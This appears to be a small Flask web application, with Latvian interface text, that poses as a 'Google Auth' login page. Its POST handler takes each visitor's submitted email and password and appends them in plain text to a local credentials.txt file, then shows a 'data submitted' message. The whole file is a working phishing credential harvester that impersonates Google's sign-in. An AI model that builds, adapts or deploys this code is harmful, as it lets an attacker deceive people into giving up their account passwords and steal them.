from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return 'Ej uz <a href="/google-auth/">Google Auth</a>'

@app.route('/google-auth/', methods=['GET'])
def show_form():
    return render_template('google-auth.html')

@app.route('/google-auth/', methods=['POST'])
def handle_form():
    email = request.form['email']
    password = request.form['password']

    # Saglabāšana failā:
    with open("credentials.txt", "a", encoding="utf-8") as file:
        file.write(f"{email} | {password}\n")

    return render_template('google-auth.html', message="Dati iesniegti!")
    
